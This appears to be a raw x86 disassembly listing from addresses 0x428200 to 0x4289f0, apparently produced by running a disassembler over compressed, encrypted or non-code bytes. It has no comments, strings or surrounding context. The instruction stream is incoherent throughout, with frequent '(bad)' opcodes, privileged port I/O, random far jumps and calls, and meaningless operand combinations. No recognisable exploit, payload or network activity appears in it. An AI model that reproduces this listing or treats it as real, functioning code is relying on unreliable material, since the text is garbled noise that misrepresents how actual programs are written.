  428200:	out    0xca,eax
  428202:	pop    ebp
  428203:	add    al,BYTE PTR [eax]
  428205:	bound  ebp,QWORD PTR [eax+edi*4-0x4f891243]
  42820c:	xchg   BYTE PTR [ecx-0x7],bl
  42820f:	xchg   edi,eax
  428210:	and    al,0xeb
  428212:	jbe    0x428216
  428214:	add    ah,dl
  428216:	push   esi
  428217:	jmp    0x46e8:0x276f0ff
  42821e:	pushf  
  42821f:	add    al,BYTE PTR [eax]
  428221:	pusha  
  428222:	cld    
  428223:	sbb    eax,0x7f76e8fe
  428228:	rcr    BYTE PTR [edx+ebp*2-0x34e1f824],0x24
  428230:	adc    ch,BYTE PTR [ecx-0x503fdb8a]
  428236:	cmp    DWORD PTR [edx-0x4fce58ff],edx
  42823c:	cli    
  42823d:	jne    0x428299
  42823f:	push   es
  428240:	xchg   ecx,edi
  428242:	dec    edx
  428243:	into   
  428244:	and    ebx,ebp
  428246:	push   cs
  428247:	lods   eax,DWORD PTR ds:[esi]
  428248:	int3   
  428249:	out    0x3a,al
  42824b:	and    eax,0xa6c0
  428250:	add    BYTE PTR [eax],al
  428252:	add    BYTE PTR [ebx+0x1a],bh
  428255:	xchg   DWORD PTR [ecx],ebp
  428257:	jno    0x4281e4
  428259:	inc    edx
  42825a:	cmc    
  42825b:	icebp  
  42825c:	jg     0x42827a
  42825e:	add    BYTE PTR [ebp-0x25770000],cl
  428264:	sub    bh,dl
  428266:	call   FWORD PTR [edi+eax*4+0x7e]
  42826a:	sub    BYTE PTR [esi+0x0],cl
  42826d:	add    BYTE PTR [ebx+0x8bd950a],cl
  428273:	pop    esp
  428274:	mov    es,WORD PTR [edx-0x4b00b0f]
  42827a:	dec    DWORD PTR [esi+ebp*4+0x43]
  42827e:	and    al,0x44
  428280:	push   DWORD PTR [ebx+0x6]
  428283:	mov    ah,dh
  428285:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428286:	es sbb al,0x0
  428289:	add    esi,0x72
  42828c:	rol    BYTE PTR [ebx],0x0
  42828f:	xchg   ebx,eax
  428290:	ins    BYTE PTR es:[edi],dx
  428291:	and    al,0x2
  428293:	sbb    al,0x0
  428295:	mov    edi,0x40876406
  42829a:	add    BYTE PTR [esp+eax*4-0x76f3ffe2],dh
  4282a1:	(bad)  
  4282a2:	jmp    0x3948c8
  4282a7:	or     ch,BYTE PTR [esi+0x502801ba]
  4282ad:	gs adc al,0x61
  4282b0:	jnp    0x4282ce
  4282b2:	add    esp,ebx
  4282b4:	call   DWORD PTR [ecx-0x75]
  4282b7:	add    BYTE PTR [eax],al
  4282b9:	add    BYTE PTR [eax],al
  4282bb:	add    BYTE PTR [ebp-0x1a],ch
  4282be:	in     eax,dx
  4282bf:	mov    ch,0x72
  4282c1:	mov    bl,0xed
  4282c3:	ret    
  4282c4:	into   
  4282c5:	sub    esp,DWORD PTR [ebx]
  4282c7:	mov    ebx,eax
  4282c9:	sbb    ecx,DWORD PTR [eax]
  4282cb:	test   DWORD PTR [edx+edi*1+0x9],ebx
  4282cf:	or     DWORD PTR [edx+ecx*1+0x50],0xffffff8d
  4282d4:	dec    ebx
  4282d5:	pop    edx
  4282d6:	jecxz  0x428283
  4282d8:	jmp    0x762e7992
  4282dd:	push   edi
  4282de:	addr16 daa 
  4282e0:	xor    ch,BYTE PTR [ecx-0x1]
  4282e3:	gs popa 
  4282e5:	ror    BYTE PTR [esi+0x56],1
  4282e8:	add    BYTE PTR [eax+edi*8],bl
  4282eb:	out    0x3c,eax
  4282ed:	(bad)  
  4282ee:	pop    esp
  4282ef:	sti    
  4282f0:	in     al,dx
  4282f1:	ret    
  4282f2:	es (bad) 
  4282f4:	pop    edx
  4282f5:	imul   edi,DWORD PTR [ebp-0x4a968643],0x27f54a52
  4282ff:	adc    dh,ch
  428301:	jns    0x42835d
  428303:	je     0x428296
  428305:	cmp    DWORD PTR [edi-0x43],esp
  428308:	inc    edi
  428309:	aam    0x59
  42830b:	xchg   DWORD PTR ds:0x7e7a59e6,ebp
  428311:	retf   
  428312:	test   BYTE PTR [eax],ch
  428314:	ja     0x42837f
  428316:	(bad)  
  428317:	std    
  428318:	xchg   BYTE PTR [edi-0x78],dl
  42831b:	sti    
  42831c:	sbb    DWORD PTR [ebx-0x7a],0x4c
  428323:	add    BYTE PTR [eax],al
  428325:	pop    ecx
  428326:	xor    eax,0xd0614290
  42832b:	xor    eax,ebp
  42832d:	pop    ss
  42832e:	retf   
  42832f:	pop    esp
  428330:	sti    
  428331:	(bad)  
  428332:	and    edi,DWORD PTR [edx-0x9f48a7]
  428338:	dec    esi
  428339:	inc    ebx
  42833a:	sbb    al,0xd3
  42833c:	and    ebp,DWORD PTR [ecx-0x30]
  42833f:	push   ebx
  428340:	sti    
  428341:	inc    ecx
  428342:	inc    ebp
  428343:	repz cli 
  428345:	dec    ecx
  428346:	cmp    eax,0xf858e7f3
  42834b:	pop    ecx
  42834c:	sti    
  42834d:	(bad)  
  42834e:	and    BYTE PTR [eax+0x55962bd7],cl
  428354:	or     BYTE PTR [ebp+0x67],0xff
  428358:	push   DWORD PTR [edi+0x2]
  42835b:	pop    ebp
  42835c:	xor    BYTE PTR [esi],ah
  42835e:	test   DWORD PTR [ebx-0x16ad74d0],ebx
  428364:	xor    BYTE PTR [edi-0x4876ce13],0x69
  42836b:	cli    
  42836c:	xchg   esi,eax
  42836d:	outs   dx,DWORD PTR ds:[esi]
  42836e:	push   edx
  42836f:	fs cmp ecx,esp
  428372:	call   FWORD PTR [ebp-0x30]
  428375:	xchg   esi,eax
  428376:	neg    BYTE PTR [ebp+0x31]
  428379:	repnz dec eax
  42837b:	xchg   ecx,eax
  42837c:	mov    eax,0xb59a5104
  428381:	repz dec eax
  428383:	add    DWORD PTR [edi],0xbd8a5108
  428389:	add    BYTE PTR [eax],al
  42838b:	add    BYTE PTR [eax],al
  42838d:	add    BYTE PTR [ebp+edi*2-0x10f465a],bl
  428394:	call   0x18a1774f
  428399:	mov    bl,0xc4
  42839b:	jge    0x428391
  42839d:	shufps xmm7,XMMWORD PTR [ebp+0x60],0x56
  4283a2:	neg    BYTE PTR [edx]
  4283a4:	out    0x3,eax
  4283a6:	jne    0x4283ab
  4283a8:	pusha  
  4283a9:	(bad)  
  4283ab:	add    DWORD PTR [ebp-0x70],esp
  4283ae:	jne    0x4283b2
  4283b0:	jmp    0x6b446b3b
  4283b5:	mov    BYTE PTR [ebp+0x2],dh
  4283b8:	jmp    0xc79d3a45
  4283bd:	pop    ebp
  4283be:	ficom  WORD PTR [ecx+0x6d]
  4283c1:	inc    esp
  4283c2:	dec    eax
  4283c3:	pop    es
  4283c4:	dec    sp
  4283c6:	into   
  4283c7:	pop    ebp
  4283c8:	xchg   esp,eax
  4283c9:	mov    gs,esi
  4283cb:	push   ds
  4283cc:	out    0x3,eax
  4283ce:	jne    0x42844f
  4283d0:	push   0x0
  4283d2:	je     0x4283d6
  4283d4:	jmp    0x2818b
  4283d9:	lock out dx,eax
  4283db:	(bad)  
  4283dc:	or     eax,DWORD PTR [ecx]
  4283de:	das    
  4283df:	xchg   esi,eax
  4283e0:	cli    
  4283e1:	out    0xfd,al
  4283e3:	lea    esp,[ebx+ebp*8]
  4283e6:	jbe    0x4283ea
  4283e8:	mov    eax,0x26ee9
  4283ed:	adc    ah,BYTE PTR [ecx]
  4283ef:	std    
  4283f0:	dec    esp
  4283f1:	mov    ecx,0x0
  4283f6:	add    ch,bh
  4283f8:	(bad)  
  4283f9:	or     ebx,DWORD PTR [edx]
  4283fb:	cld    
  4283fc:	scas   al,BYTE PTR es:[edi]
  4283fd:	pop    es
  4283fe:	rcl    DWORD PTR [edi-0x12510569],0xce
  428405:	sti    
  428406:	aas    
  428407:	mov    al,0x95
  428409:	and    al,0xeb
  42840b:	jbe    0x42840f
  42840d:	xchg   DWORD PTR [esi-0x71318832],esp
  428413:	cdq    
  428414:	jnp    0x42845b
  428416:	icebp  
  428417:	lea    eax,[esp+esi*2-0x35]
  42841b:	leave  
  42841c:	xlat   BYTE PTR ds:[ebx]
  42841d:	mul    DWORD PTR [edx+0x3b]
  428420:	std    
  428421:	out    0xfb,eax
  428423:	add    cl,BYTE PTR [ebx+edi*8+0x6a]
  428427:	xor    ecx,DWORD PTR [ecx]
  428429:	add    bh,bl
  42842b:	pop    es
  42842c:	mov    BYTE PTR [ebx+0x2770d],bh
  428432:	bound  esp,QWORD PTR [ebx]
  428434:	or     DWORD PTR [edi-0x1ca57d54],eax
  42843a:	jne    0x428484
  42843c:	dec    ebp
  42843d:	xchg   DWORD PTR [esi+ebp*2+0x20e0e6b9],ebp
  428444:	dec    esp
  428445:	jne    0x428438
  428447:	pop    esi
  428448:	scas   eax,DWORD PTR es:[edi]
  428449:	int    0x1e
  42844b:	sub    DWORD PTR [ebp-0x5cbdfa7],ebp
  428451:	push   DWORD PTR [ebx+0x7f5ded]
  428457:	mov    BYTE PTR [ecx],al
  428459:	dec    esi
  42845a:	mov    eax,DWORD PTR [eax]
  42845c:	add    BYTE PTR [eax],al
  42845e:	add    BYTE PTR [eax],al
  428460:	and    DWORD PTR [ebp+0x4e],edx
  428463:	mov    esp,DWORD PTR [ebp-0x71d7814b]
  428469:	add    al,0x0
  42846b:	add    DWORD PTR ds:0x3374ef2b,eax
  428471:	sub    esi,0x7e
  428474:	das    
  428475:	cmp    DWORD PTR [edi-0x9552118],0x73c6e0ff
  42847f:	fs hlt 
  428481:	push   es
  428482:	or     BYTE PTR [eax],al
  428484:	dec    esp
  428485:	icebp  
  428486:	out    dx,eax
  428487:	lea    edi,[ebx+0x5cfffa1a]
  42848d:	std    
  42848e:	dec    esp
  42848f:	lock (bad) 
  428491:	jns    0x428512
  428493:	sbb    al,0x4d
  428495:	add    al,0x0
  428497:	push   ecx
  428498:	aad    0x39
  42849a:	test   DWORD PTR [ecx+0x14e35661],0x8bf6ac60
  4284a4:	mov    edx,edi
  4284a6:	mov    WORD PTR [edi+0x630],es
  4284ac:	xchg   esi,ebp
  4284ae:	mov    BYTE PTR [ebp-0x6c],al
  4284b1:	jg     0x4284f8
  4284b3:	adc    BYTE PTR [ebp+esi*1-0x54540151],dh
  4284ba:	je     0x4284b8
  4284bc:	addr16 inc ecx
  4284be:	or     ebp,eax
  4284c0:	xchg   esi,eax
  4284c1:	ja     0x4284b9
  4284c3:	inc    DWORD PTR [eax]
  4284c5:	add    BYTE PTR [eax],al
  4284c7:	add    BYTE PTR [eax],al
  4284c9:	push   edi
  4284ca:	inc    ecx
  4284cb:	repz mov edi,ecx
  4284ce:	mov    edi,0xacacff4d
  4284d3:	je     0x4284dd
  4284d5:	fs pop ebp
  4284d7:	int    0xff
  4284d9:	jne    0x4284d3
  4284db:	mov    edx,0x569769e6
  4284e0:	jne    0x428463
  4284e2:	or     cl,dl
  4284e4:	pop    es
  4284e5:	popf   
  4284e6:	mov    ds:0x78a2fb35,eax
  4284eb:	mov    ecx,0xff2db7c8
  4284f0:	push   esp
  4284f1:	(bad)  
  4284f2:	xor    eax,0xdc7d458a
  4284f7:	bound  ecx,QWORD PTR [esi+eiz*1]
  4284fa:	imul   esp,DWORD PTR [ebp+0x6d]
  4284fe:	scas   al,BYTE PTR es:[edi]
  4284ff:	iret   
  428500:	sti    
  428501:	into   
  428502:	xor    DWORD PTR [ebp+eiz*1-0x4eda68b],edx
  428509:	sahf   
  42850a:	mov    al,ds:0x1e9c5ed0
  42850f:	pop    eax
  428510:	jp     0x4284c0
  428512:	aam    0xbf
  428514:	pop    es
  428515:	fild   QWORD PTR [eax-0x78]
  428518:	jne    0x428557
  42851a:	adc    al,0x6c
  42851c:	cwde   
  42851d:	nop
  42851e:	pop    ecx
  42851f:	push   DWORD PTR [esi]
  428521:	cmp    cl,BYTE PTR [esi-0x3d]
  428524:	xchg   BYTE PTR [eax-0xff712af],dh
  42852a:	dec    ebp
  42852b:	pop    es
  42852c:	push   edi
  42852d:	add    BYTE PTR [eax],al
  42852f:	add    BYTE PTR [eax],al
  428531:	add    BYTE PTR ds:0x75001fe7,cl
  428537:	and    al,0x3f
  428539:	jne    0x42858a
  42853b:	aam    0xbf
  42853d:	sti    
  42853e:	jbe    0x428560
  428540:	jl     0x428569
  428542:	aaa    
  428543:	in     al,0x36
  428545:	shr    esi,1
  428547:	rcl    DWORD PTR [ecx+0xb],cl
  42854a:	sbb    dl,BYTE PTR [esi+0x6169ff57]
  428550:	mov    BYTE PTR [edx+0x77],al
  428553:	imul   edx,DWORD PTR [esi+0x75],0xf0220281
  42855a:	push   esi
  42855b:	clc    
  42855c:	test   al,0x3
  42855e:	sbb    al,0xa9
  428560:	imul   eax,DWORD PTR [ebx+0x41],0xffffffe9
  428564:	mov    al,BYTE PTR [eax]
  428566:	add    bl,cl
  428568:	out    0x6e,eax
  42856a:	stos   BYTE PTR es:[edi],al
  42856b:	jns    0x428509
  42856d:	push   edi
  42856e:	pop    esp
  42856f:	int    0xf4
  428571:	fldcw  WORD PTR [ebp+0x2fbaefdb]
  428577:	mov    al,0x3d
  428579:	dec    ebx
  42857a:	retf   
  42857b:	stc    
  42857c:	call   0xe24a4c89
  428581:	xchg   ecx,eax
  428582:	das    
  428583:	add    DWORD PTR [eax-0x57fe829c],ebp
  428589:	ins    DWORD PTR es:[edi],dx
  42858a:	push   edx
  42858b:	dec    esi
  42858c:	xor    eax,0x865a7920
  428591:	and    eax,0x59a60275
  428596:	add    BYTE PTR [eax],al
  428598:	add    BYTE PTR [eax],al
  42859a:	add    cl,cl
  42859c:	es in  eax,dx
  42859e:	imul   ecx,DWORD PTR [edx+eiz*1],0xffffffe9
  4285a2:	add    eax,DWORD PTR [edx]
  4285a4:	mov    eax,0x79a4685d
  4285a9:	and    al,0x8
  4285ab:	ret    0x19b4
  4285ae:	out    dx,al
  4285af:	sub    ebp,DWORD PTR [ecx+0x5aa244c5]
  4285b5:	jmp    0xf4fcd289
  4285ba:	and    eax,0x8cfad6bd
  4285bf:	mov    al,0xf2
  4285c1:	arpl   WORD PTR [esi+ebp*2-0x7a],ax
  4285c5:	jmp    0x2244facc
  4285ca:	add    al,0x46
  4285cc:	add    ch,cl
  4285ce:	add    ebx,esp
  4285d0:	push   edi
  4285d1:	jmp    0x87fad9
  4285d6:	lods   al,BYTE PTR ds:[esi]
  4285d7:	inc    edx
  4285d8:	add    al,BYTE PTR [eax]
  4285da:	jmp    0x2e52eb15
  4285df:	or     cl,BYTE PTR [edx+0x0]
  4285e2:	jmp    0xef29485d
  4285e7:	xor    eax,0x76e9fbc7
  4285ec:	add    al,BYTE PTR [eax-0x4a06158e]
  4285f2:	jmp    0xca42886c
  4285f7:	xor    BYTE PTR [ebx+0x276e500],cl
  4285fd:	aaa    
  4285fe:	test   al,0x0
  428600:	add    BYTE PTR [eax],al
  428602:	add    BYTE PTR [eax],al
  428604:	lods   eax,DWORD PTR ds:[esi]
  428605:	and    DWORD PTR [esi+edx*1+0x2],esi
  428609:	inc    edx
  42860a:	je     0x428626
  42860c:	bound  eax,QWORD PTR [edx]
  42860e:	add    ecx,ebp
  428610:	jbe    0x4285e8
  428612:	or     eax,0xfb4c7104
  428617:	jmp    0xe97f8e4e
  42861c:	jno    0x428620
  42861e:	add    BYTE PTR [eax+ebx*1],dh
  428621:	in     al,0xfd
  428623:	xchg   ecx,eax
  428624:	jo     0x42860a
  428626:	add    eax,DWORD PTR [edx-0x30]
  428629:	idiv   DWORD PTR [ecx+ebp*8]
  42862c:	cmp    ecx,DWORD PTR [ebp-0x5]
  42862f:	adc    eax,0xef000f80
  428634:	jbe    0x428638
  428636:	je     0x428600
  428638:	or     DWORD PTR [ebp+esi*2+0x3f358161],0x52a98103
  428643:	push   ecx
  428644:	test   al,0xec
  428646:	(bad)  
  428647:	call   0x5fc7d83d
  42864c:	sub    edi,eax
  42864e:	xchg   BYTE PTR [esi+eiz*8+0x2800c085],ah
  428655:	das    
  428656:	mov    BYTE PTR [eax],bh
  428658:	inc    edi
  428659:	xor    esp,DWORD PTR [ebp+0x5]
  42865c:	aaa    
  42865d:	mov    edi,0xb340461
  428662:	sbb    al,BYTE PTR [eax]
  428664:	fmul   st(3),st
  428666:	mov    edi,0x74
  42866b:	add    BYTE PTR [eax],al
  42866d:	fld    DWORD PTR [ebp+0x777ff08]
  428673:	sub    eax,eax
  428675:	pop    ss
  428676:	inc    esp
  428677:	pop    es
  428678:	rol    DWORD PTR [ebp-0x721e7ffa],0x77
  42867f:	inc    BYTE PTR [edi-0x3f7bb32e]
  428685:	or     esi,edi
  428687:	add    BYTE PTR [ebp-0x74],0x81
  42868b:	shl    BYTE PTR [ebp+ecx*2+0x7f],0x38
  428690:	jmp    0x4286f3
  428692:	pop    esi
  428693:	jnp    0x428695
  428695:	pop    esp
  428696:	add    BYTE PTR [ebx+0x6a],cl
  428699:	pop    edi
  42869a:	mov    ch,0x74
  42869c:	cld    
  42869d:	and    esi,DWORD PTR [edx]
  42869f:	add    ebp,eax
  4286a1:	xchg   edx,eax
  4286a2:	mov    edi,0xc6d8fff5
  4286a7:	jae    0x4286ad
  4286a9:	(bad)  
  4286aa:	or     al,0xe3
  4286ac:	sub    eax,edi
  4286ae:	sub    DWORD PTR [ebx],ecx
  4286b0:	test   ebx,esp
  4286b2:	xor    al,BYTE PTR [ebx]
  4286b4:	jmp    FWORD PTR [ecx]
  4286b6:	add    al,0xb
  4286b8:	inc    eax
  4286b9:	sbb    al,0x7f
  4286bb:	dec    DWORD PTR [edx+0x74f782e2]
  4286c1:	adc    DWORD PTR [ecx-0x41],edi
  4286c4:	call   0x3847f4
  4286c9:	retf   
  4286ca:	xlat   BYTE PTR ds:[ebx]
  4286cb:	cwde   
  4286cc:	and    cl,BYTE PTR [eax+eax*1]
  4286cf:	dec    esi
  4286d0:	call   0x4286d5
  4286d5:	add    BYTE PTR [ebp-0x38],dh
  4286d8:	sbb    eax,0x4bd87500
  4286dd:	sti    
  4286de:	dec    edx
  4286df:	mov    ds:0x5db7c8b6,eax
  4286e4:	inc    DWORD PTR [ebp+esi*4-0x3280ed73]
  4286eb:	sbb    al,0xd0
  4286ed:	xor    eax,0x41ba5f6
  4286f2:	jne    0x428769
  4286f4:	push   cs
  4286f5:	jg     0x428730
  4286f7:	cmp    eax,0x59fe0007
  4286fc:	fadd   DWORD PTR ds:0x15526c1f
  428702:	imul   esp,DWORD PTR [edi],0x278fffbf
  428708:	push   edx
  428709:	je     0x428764
  42870b:	popa   
  42870c:	push   edx
  42870d:	je     0x428760
  42870f:	push   ecx
  428710:	scas   eax,DWORD PTR es:[edi]
  428711:	out    0xa4,eax
  428713:	cwde   
  428714:	push   ebp
  428715:	sti    
  428716:	lock cdq 
  428718:	fcom   QWORD PTR [esi]
  42871a:	clc    
  42871b:	xor    cl,bl
  42871d:	adc    ebp,DWORD PTR [edx+0x2e]
  428720:	add    ecx,DWORD PTR [edi]
  428722:	mov    ch,0x59
  428724:	mov    WORD PTR [edx],es
  428726:	dec    esi
  428727:	pop    edi
  428728:	xor    dl,0xc9
  42872b:	arpl   WORD PTR [edx],di
  42872d:	add    ah,BYTE PTR [edx-0x90000a7]
  428733:	nop
  428734:	push   edx
  428735:	mov    esi,0x86b0596d
  42873a:	add    BYTE PTR [eax],al
  42873c:	add    BYTE PTR [eax],al
  42873e:	add    BYTE PTR [ecx],ah
  428740:	or     BYTE PTR [edx+0x36882586],ch
  428746:	aaa    
  428747:	es push ebp
  428749:	(bad)  
  42874a:	jle    0x428767
  42874c:	aam    0xca
  42874e:	inc    ecx
  42874f:	dec    esp
  428750:	dec    BYTE PTR [ebx]
  428752:	je     0x428708
  428754:	add    ah,BYTE PTR [ecx]
  428756:	mov    dh,0x76
  428758:	(bad)  
  428759:	in     eax,dx
  42875a:	mov    dh,BYTE PTR [edi-0x28]
  42875d:	out    0xb2,al
  42875f:	inc    ebx
  428760:	pop    edx
  428761:	rol    BYTE PTR [edx-0x11],0x4a
  428765:	outs   dx,BYTE PTR ds:[esi]
  428766:	or     eax,0xba47d32
  42876b:	inc    ebp
  42876c:	mov    bl,0x31
  42876e:	sar    BYTE PTR [edx+0x4b],1
  428771:	repz push esi
  428773:	pusha  
  428774:	mov    esi,0x85c2c3f6
  428779:	sub    edi,ecx
  42877b:	jno    0x428786
  42877d:	xchg   esp,eax
  42877e:	or     ebp,DWORD PTR [ecx]
  428780:	icebp  
  428781:	pop    ebp
  428782:	sar    BYTE PTR [esi+0x7],1
  428785:	test   dh,0x8b
  428788:	dec    ebx
  428789:	aam    0x7
  42878b:	push   0xffffffc2
  42878d:	call   0xd899ff1e
  428792:	mov    dh,BYTE PTR [esi+0x3888f956]
  428798:	(bad)  
  428799:	sbb    eax,0xaa040141
  42879e:	add    al,0xc6
  4287a0:	add    ch,cl
  4287a2:	add    eax,DWORD PTR [eax]
  4287a4:	add    BYTE PTR [eax],al
  4287a6:	add    BYTE PTR [eax],al
  4287a8:	jmp    0xa6a7:0xcbb6c23a
  4287af:	or     al,0x75
  4287b1:	scas   eax,DWORD PTR es:[edi]
  4287b2:	pop    ebp
  4287b3:	push   0x8912b3a4
  4287b8:	inc    esp
  4287b9:	sbb    BYTE PTR [ebx-0x647a5030],0x55
  4287c0:	sar    DWORD PTR [ebp+eiz*2-0x7318a94],0xcb
  4287c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4287c9:	cli    
  4287ca:	xor    bh,cl
  4287cc:	pop    edi
  4287cd:	fsubr  st(6),st
  4287cf:	mov    ebx,0xba000213
  4287d4:	mov    dh,0xc2
  4287d6:	out    0xeb,al
  4287d8:	gs inc edx
  4287da:	push   eax
  4287db:	jb     0x42879f
  4287dd:	add    DWORD PTR [ecx+0x280c6bb],ebx
  4287e3:	inc    ecx
  4287e4:	pop    ebp
  4287e5:	mov    dl,bh
  4287e7:	dec    esi
  4287e8:	cmc    
  4287e9:	inc    edx
  4287ea:	je     0x4287c6
  4287ec:	dec    ecx
  4287ed:	adc    al,0x8d
  4287ef:	mov    ah,0x3e
  4287f1:	pop    edx
  4287f2:	pushf  
  4287f3:	sub    ebp,DWORD PTR [ebx]
  4287f5:	dec    ebp
  4287f6:	test   BYTE PTR [ecx],ch
  4287f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4287f9:	inc    BYTE PTR [esi+0x17611eac]
  4287ff:	fs and dh,cl
  428802:	adc    edx,DWORD PTR [esi]
  428804:	mov    ds:0x76a90efd,al
  428809:	jnp    0x42880e
  42880b:	adc    al,BYTE PTR [eax]
  42880d:	add    BYTE PTR [eax],al
  42880f:	add    BYTE PTR [eax],al
  428811:	outs   dx,DWORD PTR ds:[esi]
  428812:	jg     0x42880f
  428814:	jne    0x4287ae
  428816:	inc    esp
  428817:	add    ebx,DWORD PTR [esi+0x6a000276]
  42881d:	cmp    DWORD PTR [ebp+0x5a],ecx
  428820:	mov    al,0x34
  428822:	(bad)  
  428823:	jmp    DWORD PTR [ebx+0x28]
  428826:	into   
  428827:	push   ds
  428828:	push   0xffffffc8
  42882a:	dec    ebp
  42882b:	je     0x42881c
  42882d:	sbb    DWORD PTR [eax-0x313693c6],eax
  428833:	or     al,0x72
  428835:	cdq    
  428836:	pop    edx
  428837:	mov    esp,0x534da8a8
  42883c:	shl    DWORD PTR [eax+0x23],0x0
  428840:	jmp    0xc87ae955
  428845:	jbe    0x428849
  428847:	das    
  428848:	test   eax,0xa98587e9
  42884d:	cmp    al,BYTE PTR [ebx]
  42884f:	ret    
  428850:	add    BYTE PTR [esi+edx*4],cl
  428853:	sti    
  428854:	dec    DWORD PTR [edx+eax*4]
  428857:	enter  0xdfff,0x97
  42885b:	sub    ah,0x9d
  42885e:	loope  0x428867
  428860:	add    cl,BYTE PTR [eax*1+0x4d198b4f]
  428867:	mov    WORD PTR [ebp-0x94fbc],es
  42886d:	sub    al,0x7a
  42886f:	inc    ebp
  428870:	or     BYTE PTR [ebp+esi*8-0x7],al
  428874:	inc    DWORD PTR [eax]
  428876:	add    BYTE PTR [eax],al
  428878:	add    BYTE PTR [eax],al
  42887a:	int3   
  42887b:	lea    edi,[edi-0x40]
  42887e:	adc    BYTE PTR [ecx-0xa],bl
  428881:	jne    0x428823
  428883:	jg     0x42880a
  428885:	clc    
  428886:	cdq    
  428887:	scas   al,BYTE PTR es:[edi]
  428888:	idiv   bh
  42888a:	loope  0x42888c
  42888c:	push   eax
  42888d:	call   0x393859
  428892:	push   ebp
  428893:	ret    0x4582
  428896:	rol    bh,0xbf
  428899:	je     0x42882d
  42889b:	add    eax,0x49c5700
  4288a0:	add    BYTE PTR [ebx-0x3c3751ac],al
  4288a6:	pop    es
  4288a7:	cmp    bl,BYTE PTR [edi]
  4288a9:	add    al,0x42
  4288ab:	mov    ch,0x73
  4288ad:	and    al,0x6c
  4288af:	leave  
  4288b0:	jae    0x4288d6
  4288b2:	fs mov ch,0x73
  4288b5:	and    al,0x3c
  4288b7:	lods   al,BYTE PTR ds:[esi]
  4288b8:	aas    
  4288b9:	(bad)  
  4288ba:	sbb    esi,DWORD PTR [ebp+edx*2+0x1f3ad7c3]
  4288c1:	add    al,0x63
  4288c3:	mov    bl,0x73
  4288c5:	and    al,0x40
  4288c7:	leave  
  4288c8:	jnp    0x4288ee
  4288ca:	inc    eax
  4288cb:	mov    ch,0x73
  4288cd:	and    al,0x75
  4288cf:	dec    ecx
  4288d0:	push   edi
  4288d1:	ja     0x4288fe
  4288d3:	jns    0x428924
  4288d5:	pop    ebx
  4288d6:	ss aad 0xc7
  4288d9:	and    ebp,DWORD PTR [ebp-0x11]
  4288dc:	jp     0x428952
  4288de:	add    BYTE PTR [eax],al
  4288e0:	add    BYTE PTR [eax],al
  4288e2:	add    BYTE PTR [ecx+0x61],bl
  4288e5:	push   edi
  4288e6:	inc    edx
  4288e7:	or     bl,cl
  4288e9:	dec    esi
  4288ea:	pop    edx
  4288eb:	ss aad 0xc7
  4288ee:	and    ebp,DWORD PTR [ecx-0x2c]
  4288f1:	mov    edi,0x4e887923
  4288f6:	je     0x428889
  4288f8:	and    eax,0x61997c7a
  4288fd:	push   edi
  4288fe:	rcr    ebx,0x8
  428901:	dec    edi
  428902:	pop    ebx
  428903:	mov    dh,0x66
  428905:	jp     0x4288f3
  428907:	hlt    
  428908:	add    eax,0x59c2fdfc
  42890d:	mov    dh,0x86
  42890f:	cmp    BYTE PTR [ecx-0x80],cl
  428912:	test   DWORD PTR [ebp+0x45fb4eee],ebp
  428918:	in     al,0xc8
  42891a:	pop    es
  42891b:	lea    ebp,[edx+0x68750004]
  428921:	add    eax,0x9
  428924:	and    eax,0x568d8580
  428929:	dec    esi
  42892a:	sti    
  42892b:	and    eax,0x7bc44031
  428930:	sub    BYTE PTR [ebx+0x1255e9c0],al
  428936:	sar    BYTE PTR [esp+ebx*4],0x82
  42893a:	enter  0x9262,0x42
  42893e:	push   ebp
  42893f:	out    dx,al
  428940:	xor    al,0x84
  428942:	in     al,dx
  428943:	gs pop ebx
  428945:	(bad)  
  428946:	inc    DWORD PTR [eax]
  428948:	add    BYTE PTR [eax],al
  42894a:	add    BYTE PTR [eax],al
  42894c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42894d:	out    dx,eax
  42894e:	mov    dh,0x65
  428950:	jbe    0x428954
  428952:	je     0x42892c
  428954:	inc    edx
  428955:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428956:	push   cs
  428957:	in     eax,0x98
  428959:	int3   
  42895a:	xor    BYTE PTR [edi+edi*8-0x67],bl
  42895e:	mov    dl,BYTE PTR [edx-0x69]
  428961:	jns    0x42894e
  428963:	xchg   BYTE PTR [edi],dh
  428965:	add    al,0x2a
  428967:	fldenv [ecx]
  428969:	adc    ebp,DWORD PTR [ecx+0x6abcfde9]
  42896f:	jle    0x428929
  428971:	repnz adc eax,0xe4ca7a2f
  428977:	add    al,0x68
  428979:	std    
  42897a:	pop    ebp
  42897b:	shl    DWORD PTR [edx+0x5b],cl
  42897e:	out    0x16,eax
  428980:	out    0x74,eax
  428982:	ins    BYTE PTR es:[edi],dx
  428983:	push   ebx
  428984:	fadd   DWORD PTR [esi+0x3a]
  428987:	mov    bl,0xda
  428989:	add    al,BYTE PTR [ecx+0x5bb1ce52]
  42898f:	enter  0xb1ca,0x67
  428993:	dec    ecx
  428994:	xchg   edi,eax
  428995:	(bad)  
  428996:	call   0xfc89d09e
  42899b:	repz test edx,eax
  42899e:	call   0x92103f2b
  4289a3:	xor    al,0x51
  4289a6:	cld    
  4289a7:	push   ecx
  4289a8:	mov    ?,WORD PTR [ecx-0xd19080f]
  4289ae:	test   al,0x3
  4289b0:	add    BYTE PTR [eax],al
  4289b2:	add    BYTE PTR [eax],al
  4289b4:	add    dl,bh
  4289b6:	cmp    DWORD PTR [edi+eax*4-0x7b],esi
  4289ba:	inc    esp
  4289bb:	ficom  DWORD PTR [ecx-0x4]
  4289be:	mov    bh,0xf8
  4289c0:	or     al,0x3d
  4289c2:	iret   
  4289c3:	xor    eax,0x6df6e07d
  4289c8:	xlat   BYTE PTR ds:[ebx]
  4289c9:	jb     0x42894c
  4289cb:	mov    ds:0x3cd252,al
  4289d0:	jmp    0x428980
  4289d2:	pusha  
  4289d3:	jecxz  0x428983
  4289d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4289d6:	or     eax,0xb56725bf
  4289db:	dec    esi
  4289dc:	ss out dx,eax
  4289de:	mov    ch,0xfa
  4289e0:	sbb    al,0x21
  4289e2:	mov    ch,0x4e
  4289e4:	mov    gs,WORD PTR [edx]
  4289e6:	ficom  WORD PTR [eax]
  4289e8:	sub    DWORD PTR [ecx+0xd],esi
  4289eb:	mov    edi,0xf70d70ff
  4289f0:	div    DWORD PTR [edi+esi*2+0xc]
